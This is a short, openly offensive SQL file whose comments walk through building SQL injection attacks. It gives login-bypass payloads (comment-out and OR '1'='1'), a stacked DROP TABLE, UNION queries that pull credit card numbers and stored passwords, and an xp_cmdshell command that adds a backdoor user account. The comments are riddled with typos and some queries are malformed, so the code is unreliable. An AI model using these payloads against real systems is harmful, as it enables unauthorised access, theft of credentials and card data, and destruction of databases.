-- now we are going to create sql injection for web attacks and applicattion security cracking
-- now let's create a strong attck vector  for sql injection 

SELECT * From users WHERE username = 'admin' -- 'AND password ='password123';
-- In this example, the attacker is tyring to attmpt to login as the admin userwithout knowing the password
-- The double dash (--) is used to comment out the rest of the sql query, effectively bypassing the password check
-- this is a basic example of sql injection attck
-- now let's see another example of sql injection attack

SELECT * From products WHERE product id = 1; DROP TABLE products;
-- In this example, the attacker is trying to drop the entire products table from the database 
-- this is a more detructive from of sql injecion attack
--non let's create more attacks for qsl injvection
SELECT * From users WHERE username = '' OR '1'='1' -- 'AND' password ='';
-- in this example the attacker is trying to bypass the login authentication by using a taulogy 
-- now let's make this attack more advanced 
SELECT * From users WHERE username = 'admin' UNION SELECT credit_card_number, expiration_date FROM credit_card_numbers; -- 'AND password ='';

-- now create something that is going to collect all the passwords inside a website database
SELECT * From users WHERE username ='admin' UNION SELECT password, null FROM users; -- 'AND password ='';

-- now let's inject a software vulnerability using sql injection 
SELECT * FROM users WHERE username ='admin'; EXEC xp_cmdshell('net user hacker P@ssowrd123 /add'); -- 'AND passowrd ='';
